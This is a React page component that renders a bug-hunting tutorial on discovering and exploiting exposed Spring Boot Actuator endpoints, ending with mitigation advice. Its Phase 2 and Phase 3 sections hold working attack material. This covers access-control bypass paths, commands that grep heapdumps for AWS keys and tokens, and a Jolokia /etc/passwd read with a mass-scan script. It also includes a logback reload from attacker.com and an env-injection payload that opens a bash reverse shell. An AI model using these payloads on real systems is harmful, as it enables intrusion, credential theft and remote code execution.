"use client"

import { useState } from "react"
import Image from "next/image"
import Link from "next/link"
import { MainSidebar } from "@/components/main-sidebar"
import { PageTitle } from "@/components/page-title"
import { cn } from "@/lib/utils"
import {
  Server, ChevronRight, Home,
  Search, Shield, FileText,
  Bug, Lock, Zap, Github,
} from "lucide-react"

const phases = [
  { id: "intro", label: "Introduction" },
  { id: "phase-1-discovery", label: "Phase 1 — Discovery" },
  { id: "phase-2-enumeration", label: "Phase 2 — Enumeration" },
  { id: "phase-3-exploitation", label: "Phase 3 — Exploitation" },
  { id: "tools", label: "Tools" },
  { id: "mitigation", label: "Mitigation" },
  { id: "conclusion", label: "Conclusion" },
]

function CodeBlock({ request }: { request: string }) {
  return (
    <div className="rounded-lg border border-border bg-card overflow-hidden">
      <pre className="overflow-x-auto p-4 text-sm text-foreground font-mono leading-relaxed"><code>{request}</code></pre>
    </div>
  )
}

function CommandLine({ cmd }: { cmd: string }) {
  return (
    <div className="rounded-lg border border-border bg-card overflow-hidden">
      <pre className="overflow-x-auto p-4 text-sm text-foreground font-mono leading-relaxed"><code>{cmd}</code></pre>
    </div>
  )
}

export default function SpringBootPage() {
  const [activePhase, setActivePhase] = useState("intro")
  const [expandedImg, setExpandedImg] = useState<string | null>(null)

  const scrollToSection = (id: string) => {
    setActivePhase(id)
    const element = document.getElementById(id)
    if (element) {
      element.scrollIntoView({ behavior: "smooth", block: "start" })
    }
  }

  return (
    <div className="min-h-screen bg-background">
      <PageTitle title="Spring Boot Actuator" />
      <MainSidebar />

      <main id="main-content" className="lg:pl-64">
        {/* Breadcrumb */}
        <div className="border-b border-border bg-card/50">
          <div className="mx-auto max-w-5xl px-6 py-3">
            <nav className="flex items-center gap-2 text-sm text-muted-foreground">
              <Link href="/" className="flex items-center gap-1 hover:text-foreground">
                <Home className="h-4 w-4" />
              </Link>
              <ChevronRight className="h-4 w-4" />
              <Link href="/tech-specific" className="hover:text-foreground">Tech-Specific</Link>
              <ChevronRight className="h-4 w-4" />
              <span className="text-foreground">Spring Boot Actuator</span>
            </nav>
          </div>
        </div>

        {/* Hero */}
        <div className="relative overflow-hidden border-b border-border bg-gradient-to-br from-primary/10 via-background to-accent/5">
          <div className="relative px-6 py-12 text-center lg:py-16">
            <div className="mx-auto mb-4 flex h-16 w-16 items-center justify-center rounded-2xl bg-primary/10 text-primary">
              <Server className="h-8 w-8" />
            </div>
            <h1 className="text-3xl font-bold text-foreground lg:text-4xl text-balance">
              Spring Boot Actuator
            </h1>
            <p className="mx-auto mt-3 max-w-2xl text-muted-foreground text-pretty">
              Actuator Unleashed: A Guide to Finding and Exploiting Spring Boot Actuator Endpoints
            </p>
            <p className="mx-auto mt-2 max-w-2xl text-sm text-muted-foreground">
              A hands-on walkthrough to find, test and exploit Actuator endpoints for bug hunters.
            </p>
            <div className="mt-6 flex flex-wrap items-center justify-center gap-3">
              <span className="rounded-full bg-primary/10 px-4 py-2 text-sm font-medium text-primary">3 Phases</span>
              <span className="rounded-full bg-accent/10 px-4 py-2 text-sm font-medium text-accent">30+ Commands</span>
              <span className="rounded-full bg-secondary px-4 py-2 text-sm font-medium text-foreground">Copy Ready</span>
            </div>

            {/* Hero Image */}
            <div className="mx-auto mt-8 max-w-3xl overflow-hidden rounded-xl border border-border cursor-pointer" onClick={() => setExpandedImg("/images/tech-specific/spring-boot/9df079c691b8fb1e97cb52193cacb6d8de4f89aa.webp")}>
              <Image src="/images/tech-specific/spring-boot/9df079c691b8fb1e97cb52193cacb6d8de4f89aa.webp" alt="Spring Boot Actuator" width={1200} height={675} className="w-full" style={{ height: "auto" }} priority unoptimized />
            </div>
            <div className="mt-4 text-center text-sm">
              <span className="text-muted-foreground">Source: </span>
              <a href="https://x.com/lostsec_" target="_blank" rel="noopener noreferrer"
                className="inline-flex items-center gap-1 font-medium text-primary hover:text-primary/80 transition-colors">
                @lostsec_
                <svg className="h-3.5 w-3.5" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
                </svg>
              </a>
            </div>
          </div>
        </div>

        {/* Sticky Nav */}
        <div className="sticky top-0 z-20 border-b border-border bg-card/95 backdrop-blur-sm">
          <div className="mx-auto max-w-5xl px-6">
            <div className="flex gap-1 overflow-x-auto py-3 scrollbar-hide">
              {phases.map((p) => (
                <button key={p.id} onClick={() => scrollToSection(p.id)}
                  className={cn("flex shrink-0 items-center gap-2 rounded-lg px-3 py-2 text-sm font-medium transition-colors",
                    activePhase === p.id ? "bg-primary text-primary-foreground" : "text-muted-foreground hover:bg-muted hover:text-foreground"
                  )}>
                  {p.label}
                </button>
              ))}
            </div>
          </div>
        </div>

        {/* Content */}
        <div className="mx-auto max-w-5xl space-y-12 p-6">

          {/* Introduction */}
          <section id="intro" className="scroll-mt-24">
            <h2 className="mb-4 text-2xl font-bold text-foreground">Introduction</h2>
            <p className="text-muted-foreground leading-relaxed">
              Spring Boot Actuator is a developer&apos;s best friend. It provides powerful, production-ready features for monitoring and managing applications with minimal effort. Through a series of HTTP endpoints, developers can check application health, view metrics, understand configurations and much more. However, when misconfigured and exposed to the public internet, this helpful tool can turn into a critical security vulnerability, offering a backdoor for attackers.
            </p>
            <p className="mt-4 text-muted-foreground leading-relaxed">
              In this article I explore the methods used by security researchers and attackers to discover, enumerate and exploit these exposed actuator endpoints.
            </p>

            <div className="mt-4 text-center text-sm">
              <span className="text-muted-foreground">Source: </span>
              <a href="https://x.com/lostsec_" target="_blank" rel="noopener noreferrer"
                className="inline-flex items-center gap-1 font-medium text-primary hover:text-primary/80 transition-colors">
                @lostsec_
                <svg className="h-3.5 w-3.5" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z" />
                </svg>
              </a>
            </div>
          </section>

          {/* Phase 1 — Discovery */}
          <section id="phase-1-discovery" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Search className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-primary">Phase 1</span>
                <h2 className="text-2xl font-bold text-foreground">Discovery: Finding Exposed Instances</h2>
              </div>
            </div>
            <p className="mb-6 text-muted-foreground leading-relaxed">
              My testing begins with large-scale scanning and fingerprinting to locate Spring Boot instances and determine whether their Actuator management endpoints are exposed to the internet.
            </p>

            <h3 className="mb-3 text-lg font-semibold text-foreground">Using Search Engines like Shodan</h3>
            <p className="mb-4 text-sm text-muted-foreground">
              Internet-wide scanners such as Shodan accelerate reconnaissance. I often fingerprint Spring Boot apps by matching the default favicon hash. You can use a dork like these in Shodan to find potential targets within a specific organization:
            </p>
            <div className="space-y-3">
              <CommandLine cmd="org:target_org http.favicon.hash:116323821" />
              <CommandLine cmd='ssl:"example.com" http.favicon.hash:116323821' />
              <CommandLine cmd='ssl.cert.subject.CN:"*.example.com" http.favicon.hash:116323821' />
              <CommandLine cmd='hostname:"example.com" http.favicon.hash:116323821' />
              <CommandLine cmd='ssl.cert.subject.CN:"example.com" http.favicon.hash:116323821' />
            </div>
            <p className="mt-3 text-sm text-muted-foreground">
              These query filters return hosts and organizations tied to the target that present the default Spring Boot favicon, giving me a quick initial target list.
            </p>

            <div className="mt-6 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/tech-specific/spring-boot/60d7b46808b8b69958c9fbede8e9442e7a86da33.webp")}>
              <Image src="/images/tech-specific/spring-boot/60d7b46808b8b69958c9fbede8e9442e7a86da33.webp" alt="Shodan search results" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>

            <h3 className="mb-3 mt-8 text-lg font-semibold text-foreground">Active Scanning and Wordlist-Based Fuzzing</h3>
            <p className="mb-4 text-sm text-muted-foreground">
              Once I have a list of potential targets, the next step is to verify the presence of Actuator endpoints. To do this, I use a combination of tools to fuzz and probe for common paths.
            </p>

            <h4 className="mb-2 font-medium text-foreground">Nuclei Scanner</h4>
            <p className="mb-3 text-sm text-muted-foreground">
              Nuclei is a fast, template-based scanner that runs reusable YAML checks across multiple hosts in parallel.
            </p>
            <div className="space-y-3">
              <CommandLine cmd="cat act.txt | nuclei -tags actuator -c 50" />
            </div>
            <div className="mt-4 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/tech-specific/spring-boot/061ba3ae4d04552a9674282c539de9ca28d8d6d9.webp")}>
              <Image src="/images/tech-specific/spring-boot/061ba3ae4d04552a9674282c539de9ca28d8d6d9.webp" alt="Nuclei scan results" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>
            <div className="mt-3">
              <CommandLine cmd="cat act.txt | nuclei -tags jolokia -es info,low -silent" />
            </div>
            <div className="mt-4 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/tech-specific/spring-boot/2fca1faecefed4caef4d2550ae5ea75184321ae0.webp")}>
              <Image src="/images/tech-specific/spring-boot/2fca1faecefed4caef4d2550ae5ea75184321ae0.webp" alt="Nuclei Jolokia scan" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>

            <h4 className="mb-2 mt-8 font-medium text-foreground">Dirsearch</h4>
            <p className="mb-3 text-sm text-muted-foreground">
              A classic tool for discovering web content. Using a specialized wordlist like one from SecLists makes it highly effective.
            </p>
            <div className="space-y-3">
              <CommandLine cmd="dirsearch -l target.txt -w /Seclist/Discovery/Web-Content/spring-boot.txt -x 404 -o output.txt" />
            </div>
            <div className="mt-4 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/tech-specific/spring-boot/cc1f5141ebde55f2862eb1ed886d71d785adb6ed.webp")}>
              <Image src="/images/tech-specific/spring-boot/cc1f5141ebde55f2862eb1ed886d71d785adb6ed.webp" alt="Dirsearch results" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>

            <h4 className="mb-2 mt-8 font-medium text-foreground">Httpx-Toolkit</h4>
            <p className="mb-3 text-sm text-muted-foreground">
              A fast, multi-purpose HTTP toolkit perfect for probing many hosts for specific endpoints.
            </p>
            <div className="space-y-3">
              <CommandLine cmd="cat targets.txt | httpx-toolkit -silent -threads 50 -path '/actuator,/actuator/health,/actuator/info' -mc 200,401,403,302 > actuators.txt" />
            </div>
            <div className="mt-4 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/tech-specific/spring-boot/25b8f180c8536b45a7511cb00bacf16ffff82417.webp")}>
              <Image src="/images/tech-specific/spring-boot/25b8f180c8536b45a7511cb00bacf16ffff82417.webp" alt="Httpx-toolkit scan results" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>
            <p className="mt-3 text-sm text-muted-foreground">
              The scan filters for responses like 200, 401, and 403; any of these responses confirm the endpoint is reachable. An example of a found live endpoint looks like this:
            </p>

            <div className="mt-6 grid grid-cols-1 sm:grid-cols-2 gap-2">
              {[
                "http://ipaddr/actuator", "http://ipaddr/actuator/health",
                "http://ipaddr/actuator/info", "http://ipaddr/actuator/env",
                "http://ipaddr/actuator/configprops", "http://ipaddr/actuator/beans",
                "http://ipaddr/actuator/mappings", "http://ipaddr/actuator/metrics",
                "http://ipaddr/actuator/metrics/{metric}", "http://ipaddr/actuator/loggers",
                "http://ipaddr/actuator/threaddump", "http://ipaddr/actuator/heapdump",
                "http://ipaddr/actuator/jolokia", "http://ipaddr/actuator/hawtio",
                "http://ipaddr/actuator/httptrace", "http://ipaddr/actuator/auditevents",
                "http://ipaddr/actuator/scheduledtasks", "http://ipaddr/actuator/caches",
                "http://ipaddr/actuator/caches/{cacheName}", "http://ipaddr/actuator/sessions",
                "http://ipaddr/actuator/sessions/{sessionId}", "http://ipaddr/actuator/shutdown",
                "http://ipaddr/actuator/startup", "http://ipaddr/actuator/prometheus",
                "http://ipaddr/actuator/trace", "http://ipaddr/actuator/conditions",
                "http://ipaddr/actuator/refresh", "http://ipaddr/actuator/restart",
                "http://ipaddr/actuator/env/{property}",
              ].map((ep) => (
                <div key={ep} className="rounded-md bg-muted/50 px-3 py-2 text-xs text-muted-foreground font-mono truncate">{ep}</div>
              ))}
            </div>

            <div className="mt-6 overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/tech-specific/spring-boot/266dc4e8c146942dd7ecb4ca836af4dd1c4c8be0.webp")}>
              <Image src="/images/tech-specific/spring-boot/266dc4e8c146942dd7ecb4ca836af4dd1c4c8be0.webp" alt="Actuator endpoints list" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
            </div>
          </section>

          {/* Phase 2 — Enumeration */}
          <section id="phase-2-enumeration" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Shield className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-primary">Phase 2</span>
                <h2 className="text-2xl font-bold text-foreground">Enumeration and Bypassing Protections</h2>
              </div>
            </div>
            <p className="mb-6 text-muted-foreground leading-relaxed">
              Finding an endpoint is only step one. The real value is what the endpoint exposes. I focus on enumerating sensitive endpoints and testing common protections.
            </p>

            <h3 className="mb-3 text-lg font-semibold text-foreground">Key Sensitive Endpoints</h3>
            <p className="mb-4 text-sm text-muted-foreground">
              In my assessments, I prioritize certain endpoints because of the high-impact data they can expose:
            </p>
            <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 gap-3 mb-6">
              {[
                { ep: "/actuator/env", desc: "Environment properties, keys, credentials" },
                { ep: "/actuator/heapdump", desc: "Full JVM heap dump (secrets)" },
                { ep: "/actuator/jolokia", desc: "JMX MBeans (RCE/LFI)" },
                { ep: "/actuator/configprops", desc: "Configuration properties" },
                { ep: "/actuator/beans", desc: "All Spring beans" },
                { ep: "/actuator/loggers", desc: "Logger levels (can modify)" },
                { ep: "/actuator/threaddump", desc: "Thread dump (debug info)" },
                { ep: "/actuator/httptrace", desc: "Recent HTTP traces" },
              ].map((item) => (
                <div key={item.ep} className="rounded-lg border border-border bg-card p-3">
                  <div className="text-xs font-mono text-primary mb-1">{item.ep}</div>
                  <div className="text-xs text-muted-foreground">{item.desc}</div>
                </div>
              ))}
            </div>

            <h3 className="mb-3 text-lg font-semibold text-foreground">Bypassing Access Controls</h3>
            <p className="mb-4 text-sm text-muted-foreground">
              Often, sensitive endpoints are protected by a WAF or a reverse proxy that restricts access to internal IPs. However, these protections can sometimes be bypassed by tricking the application into thinking the request is internal. This can be done by spoofing HTTP headers like <code className="rounded bg-muted px-1 py-0.5 text-xs">X-Forwarded-For</code>.
            </p>
            <div className="space-y-3">
              <div className="rounded-lg border border-border bg-card overflow-hidden">
                <pre className="overflow-x-auto p-4 text-sm text-foreground font-mono leading-relaxed"><code>{`GET /actuator/env HTTP/1.1
Host: example.com
X-Forwarded-For: 127.0.0.1`}</code></pre>
              </div>
            </div>

            <h4 className="mb-2 mt-6 font-medium text-foreground">Path-Based Bypass Patterns</h4>
            <p className="mb-3 text-sm text-muted-foreground">
              Small URL tweaks can cause servers or proxies to respond differently, useful for bypass.
            </p>

            <div className="grid gap-4 sm:grid-cols-2">
              <div className="rounded-lg border border-border bg-card p-4">
                <h5 className="mb-2 text-sm font-semibold text-foreground">Semicolon / Matrix-Segment Tricks</h5>
                <div className="space-y-1 text-xs font-mono text-muted-foreground">
                  <div>/actuator;/env</div>
                  <div>/actuator;jsessionid=1234/env</div>
                  <div>/actuator;/</div>
                </div>
              </div>
              <div className="rounded-lg border border-border bg-card p-4">
                <h5 className="mb-2 text-sm font-semibold text-foreground">Double-Slash &amp; Extra Segments</h5>
                <div className="space-y-1 text-xs font-mono text-muted-foreground">
                  <div>//actuator</div>
                  <div>/actuator//env</div>
                  <div>/actuator/.</div>
                </div>
              </div>
              <div className="rounded-lg border border-border bg-card p-4">
                <h5 className="mb-2 text-sm font-semibold text-foreground">Dot-Segment / Traversal-Style</h5>
                <div className="space-y-1 text-xs font-mono text-muted-foreground">
                  <div>/./actuator</div>
                  <div>/../actuator</div>
                </div>
              </div>
              <div className="rounded-lg border border-border bg-card p-4">
                <h5 className="mb-2 text-sm font-semibold text-foreground">URL / Percent-Encoding</h5>
                <div className="space-y-1 text-xs font-mono text-muted-foreground">
                  <div>/%2e%2e/actuator</div>
                  <div>/actuator%2Fenv</div>
                  <div>/actuator%00</div>
                </div>
              </div>
              <div className="rounded-lg border border-border bg-card p-4">
                <h5 className="mb-2 text-sm font-semibold text-foreground">Trailing Dots &amp; Extension Variants</h5>
                <div className="space-y-1 text-xs font-mono text-muted-foreground">
                  <div>/actuator.</div>
                  <div>/actuator..</div>
                  <div>/actuator.json</div>
                  <div>/actuator.html</div>
                </div>
              </div>
              <div className="rounded-lg border border-border bg-card p-4">
                <h5 className="mb-2 text-sm font-semibold text-foreground">Query / Path-Mix Encodings</h5>
                <div className="space-y-1 text-xs font-mono text-muted-foreground">
                  <div>/actuator?path=env</div>
                  <div>/actuator/env?some=param</div>
                  <div>/actuator%3Fenv</div>
                </div>
              </div>
            </div>

            <div className="mt-6 grid gap-4 sm:grid-cols-2">
              <div className="rounded-lg border border-border bg-card p-4">
                <h5 className="mb-2 text-sm font-semibold text-foreground">Scheme, Host and Port Variations</h5>
                <div className="space-y-1 text-xs font-mono text-muted-foreground">
                  <div>https://target:8080/actuator</div>
                  <div>http://target/actuator</div>
                </div>
              </div>
              <div className="rounded-lg border border-border bg-card p-4">
                <h5 className="mb-2 text-sm font-semibold text-foreground">HTTP Verb / Header Probes</h5>
                <p className="mb-2 text-xs text-muted-foreground">Try different verbs:</p>
                <div className="space-y-1 text-xs font-mono text-muted-foreground">
                  <div>GET</div>
                  <div>HEAD</div>
                  <div>OPTIONS</div>
                </div>
                <p className="mt-2 mb-1 text-xs text-muted-foreground">Proxy-related headers:</p>
                <div className="space-y-1 text-xs font-mono text-muted-foreground">
                  <div>X-Original-URL: /actuator/env</div>
                  <div>X-Rewrite-URL: /actuator/env</div>
                  <div>X-Forwarded-For: 127.0.0.1</div>
                </div>
              </div>
            </div>
          </section>

          {/* Phase 3 — Exploitation */}
          <section id="phase-3-exploitation" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Zap className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-primary">Phase 3</span>
                <h2 className="text-2xl font-bold text-foreground">Exploitation: From Information to Impact</h2>
              </div>
            </div>
            <p className="mb-6 text-muted-foreground leading-relaxed">
              Once I gain access to a sensitive endpoint, the final step is to demonstrate the potential impact of the exposure.
            </p>

            <h3 className="mb-3 text-lg font-semibold text-foreground">Analyzing the Heapdump for Secrets</h3>
            <p className="mb-4 text-sm text-muted-foreground">
              The <code className="rounded bg-muted px-1 py-0.5 text-xs">/actuator/heapdump</code> endpoint returns a gzipped binary file that can be a goldmine for credentials. The <code className="rounded bg-muted px-1 py-0.5 text-xs">strings</code> command combined with <code className="rounded bg-muted px-1 py-0.5 text-xs">grep</code> is a simple yet powerful way to sift through this data for known patterns, such as AWS keys which often start with &ldquo;AKIA&rdquo;.
            </p>
            <div className="space-y-3">
              <CommandLine cmd="# Download the heapdump first: wget http://target.com/actuator/heapdump" />
              <CommandLine cmd="strings heapdump | grep -B 2 -A 2 &quot;AKIA&quot;" />
            </div>
            <p className="mt-3 text-sm text-muted-foreground">
              The <code className="rounded bg-muted px-1 py-0.5 text-xs">-B</code> (before) and <code className="rounded bg-muted px-1 py-0.5 text-xs">-A</code> (after) flags provide context around the key, which might reveal the corresponding secret key and demonstrate a critical data leak.
            </p>

            <h4 className="mb-2 mt-6 font-medium text-foreground">More Useful Regex Patterns</h4>
            <div className="space-y-3">
              <CommandLine cmd="strings -a -n 6 heapdump | grep -Eo 'AKIA[0-9A-Z]{16}' | sort -u > aws_keys.txt" />
              <CommandLine cmd="strings -a -n 10 heapdump | grep -Eo '[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+' | sort -u > jwt_candidates.txt" />
              <CommandLine cmd="strings -a -n 10 heapdump | grep -Eo '[A-Za-z0-9_\-]{20,}' | sort -u > long_token_candidates.txt" />
              <CommandLine cmd={`strings -a -n 6 heapdump.hprof | grep -Ei 'password|passwd|pwd|secret|api[_-]?key|token|auth|authorization|bearer|aws|AKIA|ssh-rsa' -n > possible_secrets.txt`} />
            </div>
            <p className="mt-3 text-sm text-muted-foreground">
              You can also analyze and monitor it using <a href="https://visualvm.github.io/download.html" target="_blank" rel="noopener noreferrer" className="text-primary hover:underline">VisualVM</a> to inspect memory usage, identify objects and detect sensitive data.
            </p>

            <div className="mt-6 grid gap-4 sm:grid-cols-2">
              <div className="overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/tech-specific/spring-boot/511fb82425cfea4779a27c6331ae970f03f72819.webp")}>
                <Image src="/images/tech-specific/spring-boot/511fb82425cfea4779a27c6331ae970f03f72819.webp" alt="Heapdump analysis VisualVM" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
              </div>
              <div className="overflow-hidden rounded-lg border border-border cursor-pointer" onClick={() => setExpandedImg("/images/tech-specific/spring-boot/f98612d5213a77df3cb2b9d289a15d4c713d9808.webp")}>
                <Image src="/images/tech-specific/spring-boot/f98612d5213a77df3cb2b9d289a15d4c713d9808.webp" alt="Heapdump secrets extraction" width={600} height={338} className="w-full" style={{ height: "auto" }} unoptimized />
              </div>
            </div>

            <h3 className="mb-3 mt-8 text-lg font-semibold text-foreground">Leveraging Jolokia for RCE and LFI</h3>
            <p className="mb-4 text-sm text-muted-foreground">
              From a security perspective, the <code className="rounded bg-muted px-1 py-0.5 text-xs">/actuator/jolokia</code> endpoint is one of the most critical. It exposes JMX MBeans, which can be used to interact with the underlying application server.
            </p>

            <h4 className="mb-2 font-medium text-foreground">Local File Inclusion (LFI)</h4>
            <p className="mb-3 text-sm text-muted-foreground">
              Certain MBeans can be abused to read files from the server&apos;s filesystem. This PoC uses the DiagnosticCommand MBean to read <code className="rounded bg-muted px-1 py-0.5 text-xs">/etc/passwd</code>.
            </p>
            <div className="space-y-3">
              <CodeBlock request={`http://domain.com/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd`} />
            </div>
            <p className="mt-2 text-xs text-muted-foreground">
              Note: The path /etc/passwd is encoded as !/etc!/passwd for the Jolokia exec payload.
            </p>

            <h5 className="mb-2 mt-4 font-medium text-foreground">Bash Script to Check for LFI</h5>
            <div className="space-y-3">
              <div className="rounded-lg border border-border bg-card overflow-hidden">
                <div className="bg-muted/50 px-4 py-1.5 text-xs text-muted-foreground font-mono border-b border-border">check_lfi.sh</div>
                <pre className="overflow-x-auto p-4 text-sm text-foreground font-mono leading-relaxed"><code>{`#!/bin/bash

while read ip; do
    echo "Testing: $ip"
    response=$(curl -s -m 10 "http://$ip/actuator/jolokia/exec/com.sun.management:type=DiagnosticCommand/compilerDirectivesAdd/!/etc!/passwd")
    if echo "$response" | grep -q "root:"; then
        echo "VULNERABLE: $ip"
        echo "$response" > "vulnerable_$ip.txt"
    fi
done < ip_list.txt`}</code></pre>
              </div>
            </div>

            <h4 className="mb-2 mt-6 font-medium text-foreground">Remote Code Execution (RCE)</h4>
            <p className="mb-3 text-sm text-muted-foreground">
              A classic RCE vector through Jolokia involves the Logback JMXConfigurator. An attacker can instruct the application to reload its logging configuration from a malicious, attacker-controlled URL.
            </p>
            <div className="space-y-3">
              <CodeBlock request={`http://domain.com/actuator/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/attacker.com!/logback.xml`} />
            </div>

            <h5 className="mb-2 mt-4 font-medium text-foreground">Alternative Approach: Reverse Shell</h5>
            <div className="space-y-3">
              <div className="rounded-lg border border-border bg-card overflow-hidden">
                <pre className="overflow-x-auto p-4 text-sm text-foreground font-mono leading-relaxed"><code>{`curl -X POST "http://ip/actuator/env" \\
  -H "Content-Type: application/json" \\
  -d '{
    "name":"spring.datasource.hikari.connection-test-query",
    "value":"CREATE ALIAS EXEC AS 'String shellexec(String cmd) throws java.io.IOException { Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd}); return "done"; }'; CALL EXEC('bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1');"
  }'`}</code></pre>
              </div>
            </div>
            <p className="mt-2 text-xs text-amber-400">
              Remember to start your listener first: <code className="rounded bg-muted px-1 py-0.5 text-xs">nc -lvnp YOUR_PORT</code>
            </p>
          </section>

          {/* Tools */}
          <section id="tools" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Github className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-primary">Tools</span>
                <h2 className="text-2xl font-bold text-foreground">Automation Tools I Use</h2>
              </div>
            </div>
            <p className="mb-4 text-muted-foreground leading-relaxed">
              To speed up these checks I often rely on open-source Burp Suite extensions that automate repetitive discovery and validation tasks.
            </p>
            <div className="grid gap-3 sm:grid-cols-2">
              <a href="https://github.com/xiaoliangli1128/SpringBootFinder" target="_blank" rel="noopener noreferrer"
                className="group flex items-start gap-3 rounded-lg border border-border bg-card p-4 transition-all hover:border-primary/50">
                <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-md bg-primary/10 text-primary">
                  <Bug className="h-4 w-4" />
                </div>
                <div className="min-w-0 flex-1">
                  <div className="font-medium text-foreground group-hover:text-primary">SpringBootFinder</div>
                  <p className="mt-1 text-sm text-muted-foreground line-clamp-2">Burp Suite extension for Spring Boot actuator discovery</p>
                </div>
              </a>
              <a href="https://github.com/onurgule/S4S-Scanner" target="_blank" rel="noopener noreferrer"
                className="group flex items-start gap-3 rounded-lg border border-border bg-card p-4 transition-all hover:border-primary/50">
                <div className="flex h-8 w-8 shrink-0 items-center justify-center rounded-md bg-primary/10 text-primary">
                  <Bug className="h-4 w-4" />
                </div>
                <div className="min-w-0 flex-1">
                  <div className="font-medium text-foreground group-hover:text-primary">S4S-Scanner</div>
                  <p className="mt-1 text-sm text-muted-foreground line-clamp-2">Scanner for Spring Boot actuator vulnerabilities</p>
                </div>
              </a>
            </div>
          </section>

          {/* Mitigation */}
          <section id="mitigation" className="scroll-mt-24">
            <div className="mb-6 flex items-center gap-3">
              <div className="flex h-10 w-10 items-center justify-center rounded-lg bg-primary/10 text-primary">
                <Lock className="h-5 w-5" />
              </div>
              <div>
                <span className="text-xs font-medium text-primary">Mitigation</span>
                <h2 className="text-2xl font-bold text-foreground">Protecting Your Application</h2>
              </div>
            </div>
            <p className="mb-4 text-muted-foreground leading-relaxed">
              Preventing this entire class of vulnerabilities comes down to following security best practices:
            </p>
            <ul className="space-y-3 text-muted-foreground">
              <li className="flex items-start gap-2">
                <span className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-primary/10 text-xs font-bold text-primary">1</span>
                <span>Never expose actuators to the public internet. Place them behind a firewall and ensure they are only accessible from trusted internal networks.</span>
              </li>
              <li className="flex items-start gap-2">
                <span className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-primary/10 text-xs font-bold text-primary">2</span>
                <span>Use Spring Security to protect all actuator endpoints with robust authentication and authorization.</span>
              </li>
              <li className="flex items-start gap-2">
                <span className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-primary/10 text-xs font-bold text-primary">3</span>
                <span>Change the base path from <code className="rounded bg-muted px-1 py-0.5 text-xs">/actuator</code> to something non-standard via the <code className="rounded bg-muted px-1 py-0.5 text-xs">management.endpoints.web.base-path</code> property.</span>
              </li>
              <li className="flex items-start gap-2">
                <span className="flex h-6 w-6 shrink-0 items-center justify-center rounded-full bg-primary/10 text-xs font-bold text-primary">4</span>
                <span>Disable unused and sensitive endpoints. If you don&apos;t need <code className="rounded bg-muted px-1 py-0.5 text-xs">/heapdump</code> or <code className="rounded bg-muted px-1 py-0.5 text-xs">/jolokia</code> in production, turn them off completely.</span>
              </li>
            </ul>
            <p className="mt-4 text-muted-foreground leading-relaxed">
              By understanding how these endpoints are abused, developers and security teams can take proactive steps to ensure their applications remain secure.
            </p>
          </section>

          {/* Conclusion */}
          <section id="conclusion" className="scroll-mt-24">
            <div className="rounded-xl border border-primary/20 bg-gradient-to-br from-primary/5 via-background to-accent/5 p-8">
              <h2 className="mb-4 text-2xl font-bold text-foreground text-center">Conclusion</h2>
              <p className="text-center text-muted-foreground leading-relaxed max-w-3xl mx-auto">
                Spring Boot Actuator is a fantastic tool for developers, but it carries significant risk if exposed. As I&apos;ve shown, misconfigured endpoints can lead to severe data leaks or even full remote code execution. The key to security is deliberate configuration and proactive monitoring. By understanding how these endpoints can be tested and secured, your development and security teams can take the necessary steps to keep your applications safe.
              </p>
            </div>
          </section>

          {/* Footer */}
          <footer className="border-t border-border pt-8 text-center">
            <p className="text-sm text-muted-foreground">
              This guide is for ethical use and authorized penetration testing only
            </p>
          </footer>

        </div>
      </main>

      {/* Lightbox Overlay */}
      {expandedImg && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/80 select-none" onClick={() => setExpandedImg(null)}>
          <button onClick={() => setExpandedImg(null)}
